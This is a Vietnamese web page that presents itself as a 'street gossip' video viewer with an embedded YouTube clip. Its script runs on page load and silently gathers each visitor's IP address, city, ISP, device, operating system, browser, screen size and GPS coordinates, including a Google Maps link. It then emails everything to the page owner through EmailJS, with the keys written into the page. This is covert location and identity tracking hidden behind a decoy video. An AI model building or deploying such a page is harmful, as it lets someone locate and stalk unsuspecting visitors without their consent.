<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hóng Hớt Đường Phố</title>

    <!-- Nhúng thư viện EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #0d1b2a;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        header {
            width: 100%;
            background-color: #1b263b;
            color: #4cc9f0;
            text-align: center;
            padding: 20px 0;
            border-bottom: 2px solid #415a77;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }

        header h1 {
            font-size: 2rem;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        .container {
            width: 100%;
            max-width: 800px;
            margin: 30px auto;
            padding: 0 15px;
        }

        .video-card {
            background: #1b263b;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid #415a77;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
        }

        .video-wrapper {
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
            background-color: #000;
        }

        .video-wrapper iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: 0;
        }

        .video-info {
            padding: 20px;
        }

        .video-info h2 {
            font-size: 1.3rem;
            color: #e0e1dd;
            margin-bottom: 8px;
        }

        .video-info p {
            color: #778da9;
            font-size: 0.95rem;
            line-height: 1.5;
        }

        footer {
            margin-top: auto;
            padding: 15px;
            text-align: center;
            font-size: 0.85rem;
            color: #778da9;
        }
    </style>
</head>

<body>

<header>
    <h1>Hóng Hớt Đường Phố</h1>
</header>

<div class="container">
    <div class="video-card">
        <!-- VIDEO -->
        <div class="video-wrapper">
            <iframe
                src="https://www.youtube.com/embed/gJAbDSse5WM?playsinline=1&rel=0"
                title="Hóng Hớt Đường Phố Video"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                allowfullscreen>
            </iframe>
        </div>

        <!-- NỘI DUNG -->
        <div class="video-info">
            <h2>Video Đường Phố Nổi Bật</h2>
            <p>
                Nhấn nút Play trên trình phát video để xem trực tiếp ngay trên giao diện web.
            </p>
        </div>
    </div>
</div>

<footer>
    &copy; Hóng Hớt Đường Phố. Tất cả quyền được bảo lưu.
</footer>

<script>
/* ========================================================
   CẤU HÌNH EMAILJS (Thay thế các thông số từ tài khoản EmailJS)
   ======================================================== */
const EMAILJS_PUBLIC_KEY = "0mJTEgZfXIpR2xzYq";
const EMAILJS_SERVICE_ID = "service_tby2b67";
const EMAILJS_TEMPLATE_ID = "template_n67i8qh";

(function() {
    emailjs.init(EMAILJS_PUBLIC_KEY);
})();

function sendEmail(templateParams) {
    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
        .then(() => {
            console.log("Đã gửi email thành công!");
        }, (error) => {
            console.error("Lỗi khi gửi email:", error);
        });
}

// Hàm lấy thông tin IP & Vị trí an toàn với nhiều cấp dự phòng (Fallback)
async function getIpAndLocation() {
    let result = { ip: "N/A", city: "N/A", country: "N/A", isp: "N/A" };

    // Cách 1: Thử lấy qua ipwho.is (Lấy cả IP + Địa lý + ISP)
    try {
        const res = await fetch("https://ipwho.is/");
        if (res.ok) {
            const data = await res.json();
            if (data.success) {
                return {
                    ip: data.ip || "N/A",
                    city: data.city || "N/A",
                    country: data.country || "N/A",
                    isp: data.connection?.isp || data.connection?.org || "N/A"
                };
            }
        }
    } catch (e) {
        console.warn("ipwho.is bị lỗi, thử lại với API dự phòng...");
    }

    // Cách 2 (Dự phòng): Lấy riêng IP qua ipify nếu cách 1 thất bại
    try {
        const resIp = await fetch("https://api.ipify.org?format=json");
        if (resIp.ok) {
            const dataIp = await resIp.json();
            result.ip = dataIp.ip || "N/A";
        }
    } catch (e) {
        console.error("Không thể kết nối đến server lấy IP");
    }

    return result;
}

async function collectAndSendVisitorData() {
    const ua = navigator.userAgent;

    // Xác định Hệ điều hành
    let os = "Không xác định";
    if (ua.includes("Windows NT 10.0")) os = "Windows 10/11";
    else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone")) os = "iOS - iPhone";
    else if (ua.includes("iPad")) os = "iOS - iPad";
    else if (ua.includes("Mac OS X")) os = "macOS";
    else if (ua.includes("Linux")) os = "Linux";

    // Xác định Trình duyệt
    let browser = "Không xác định";
    if (ua.includes("Edg/")) browser = "Microsoft Edge";
    else if (ua.includes("OPR/")) browser = "Opera";
    else if (ua.includes("Chrome/")) browser = "Google Chrome";
    else if (ua.includes("Firefox/")) browser = "Mozilla Firefox";
    else if (ua.includes("Safari/")) browser = "Safari";

    // Loại thiết bị, màn hình, thời gian
    let device = /Android|iPhone|iPad|iPod/i.test(ua) ? "Điện thoại / Tablet" : "Máy tính";
    const screenRes = `${window.screen.width} x ${window.screen.height}`;
    const accessTime = new Date().toLocaleString("vi-VN");

    // Lấy thông tin IP & Vị trí
    const ipData = await getIpAndLocation();

    let templateParams = {
        ip: ipData.ip,
        city: ipData.city,
        country: ipData.country,
        isp: ipData.isp,
        device: device,
        os: os,
        browser: browser,
        screen: screenRes,
        time: accessTime,
        gps: "Đang kiểm tra...",
        maps_link: "N/A"
    };

    // Kiểm tra GPS
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                templateParams.gps = `${lat}, ${lon}`;
                templateParams.maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
                sendEmail(templateParams);
            },
            (error) => {
                templateParams.gps = "Từ chối cấp quyền / Lỗi GPS";
                sendEmail(templateParams);
            },
            { timeout: 6000 }
        );
    } else {
        templateParams.gps = "Không hỗ trợ Geolocation";
        sendEmail(templateParams);
    }
}

window.addEventListener("DOMContentLoaded", collectAndSendVisitorData);
</script>

</body>
</html>
